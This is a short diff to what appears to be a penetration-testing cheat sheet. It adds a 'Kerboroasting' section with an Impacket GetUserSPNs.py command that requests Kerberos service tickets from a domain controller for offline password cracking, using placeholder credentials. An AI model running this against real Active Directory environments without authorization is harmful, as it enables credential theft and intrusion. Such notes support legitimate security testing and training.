@@ -87,3 +87,8 @@ https://wadcoms.github.io/#+Shell+Enumeration+Windows
 
 rev2self
 
+Kerboroasting
+---------------------------
+GetUserSPNs.py <domain>/username:password -dc-ip <domainIP> -request
+
+
